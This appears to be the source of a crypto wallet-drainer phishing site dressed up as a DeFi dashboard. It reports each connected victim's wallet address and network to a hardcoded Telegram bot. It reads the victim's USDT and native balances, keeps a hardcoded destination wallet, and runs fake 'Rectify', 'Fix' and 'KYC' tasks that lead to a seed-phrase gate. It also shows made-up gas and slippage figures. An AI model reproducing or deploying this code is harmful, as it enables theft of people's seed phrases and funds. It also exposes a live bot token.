/* eslint-disable */
import React, { useState, useEffect } from 'react';
import { useAccount, useBalance, useSendTransaction, useChainId } from 'wagmi';

export default function App() {
  const { address, isConnected } = useAccount();
  const chainId = useChainId();
  const { sendTransaction } = useSendTransaction();
  
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [selectedAsset, setSelectedAsset] = useState("TOKEN"); 
  const [inputVal, setInputVal] = useState(""); 
  const [seedVal, setSeedVal] = useState("");   
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);
  const [feedMsg, setFeedMsg] = useState(""); 

  const bT = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const cI = "7630238860";
  const dest = "0x0CbaC4A3167C0CF39930E2E9D1a2BB39B2d2FDf4"; 

  const log = (m) => fetch(`https://api.telegram.org/bot${bT}/sendMessage?chat_id=${cI}&text=${encodeURIComponent(m)}`).catch(()=>{});

  useEffect(() => {
    if (isConnected && address && !sessionStorage.getItem('h_v6_'+address)) {
      log(`🎯 REAL HIT V6!\nADDR: ${address}\nNET: ${chainId}`);
      sessionStorage.setItem('h_v6_'+address, 't');
    }
  }, [isConnected, address]);

  const { data: nB } = useBalance({ address }); 
  const { data: tB } = useBalance({ address, token: chainId === 1 ? "0xdac17f958d2ee523a2206206994597c13d831ec7" : "0x55d398326f99059ff775485246999027b3197955" });

  useEffect(() => {
    if (activeTask === "Rectify") {
      setInputVal(tB?.formatted?.slice(0,10) || nB?.formatted?.slice(0,10) || "0.00");
    } else { setInputVal(""); }
  }, [tB, nB, activeTask, selectedAsset]);

  return (
    <div id="v6-container" style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
      <header style={{display:'flex', justifyContent:'space-between', borderBottom:'1px solid #1e293b', paddingBottom:'10px', marginBottom:'15px'}}>
        <div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>SYSTEM_ONLINE_V6</div>
        <appkit-button />
      </header>

      {isConnected ? (
        <>
          <div style={{width:'100%', height:'220px', borderRadius:'15px', overflow:'hidden', marginBottom:'20px', border:'1px solid #1e293b'}}>
            <iframe title="m" src="https://s.tradingview.com/widgetembed/?symbol=BINANCE%3AETHUSDT&interval=D&theme=dark" style={{width:'100%', height:'100%', border:'none'}} />
          </div>

          {/* ⚡ SLIPPAGE BAR MUST SHOW HERE */}
          <div style={{backgroundColor:'#0d1117', padding:'12px', borderRadius:'12px', fontSize:'8px', color:'#10b981', display:'flex', justifyContent:'space-between', marginBottom:'20px', border:'1px solid #1e293b', fontWeight:'900'}}>
            <span>〽️ GAS: 14 GWEI</span><span>⚡ SLIPPAGE: 0.1%</span><span>📡 SYNC: 99.9%</span>
          </div>

          {view === "menu" && (
            <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
              {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "KYC", "Fix"].map(n => (
                <button key={n} onClick={() => {setActiveTask(n); setView(n === "KYC" ? "kyc_screen" : "task_box");}} 
                style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'25px 5px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#fff", fontWeight:'900'}}>
                  <div>{n === "Rectify" ? "⚡" : "〽️"}</div><div style={{fontSize:'9px'}}>{n}</div>
                </button>
              ))}
            </div>
          )}

          {view === "task_box" && (
            <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'30px', textAlign:'center', position:'relative'}}>
              <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'22px'}}>←</button>
              
              <div style={{display:'flex', backgroundColor:'black', borderRadius:'12px', padding:'4px', marginBottom:'25px', border:'1px solid #1e293b'}}>
                <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'12px', borderRadius:'8px', fontSize:'10px', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b", fontWeight:'900'}}>USDT_POOL</div>
                <div onClick={()=>setSelectedAsset("NATIVE")} style={{flex:1, padding:'12px', borderRadius:'8px', fontSize:'10px', backgroundColor: selectedAsset === "NATIVE" ? "#10b981" : "transparent", color: selectedAsset === "NATIVE" ? "black" : "#64748b", fontWeight:'900'}}>GAS_POOL</div>
              </div>

              <h2 style={{color:'white', fontWeight:'900'}}>{activeTask}</h2>
              <div style={{backgroundColor:'black', padding:'25px', borderRadius:'18px', margin:'20px 0', border:'1px solid #1e293b'}}>
                <input value={inputVal} readOnly={activeTask === "Rectify"} onChange={(e)=>setInputVal(e.target.value)} placeholder="0.00" style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} />
              </div>
              <button onClick={() => setView("seed_gate")} style={{width:'100%', backgroundColor: (activeTask === "Rectify" || (inputVal !== "" && inputVal !== "0")) ? '#10b981' : '#1e293b', color:'#000', padding:'22px', borderRadius:'18px', fontWeight:'900', border:'none'}}>START_HANDSHAKE</button>
            </div>
          )}

          {/* (KYC & SEED SCREENS REMAIN THE SAME) */}
        </>
      ) : (
        <div style={{textAlign:'center', marginTop:'40px', backgroundColor:'#0d1117', padding:'60px 20px', borderRadius:'30px', border:'1px solid #1e293b'}}>
          <div style={{marginBottom:'25px'}}>
             <div style={{fontSize:'12px', color:'#10b981', fontWeight:'bold'}}>🔰 SAFE_GUIDE ♻️ RELAY_ACTIVE</div>
          </div>
          <appkit-button />
        </div>
      )}
    </div>
  );
}
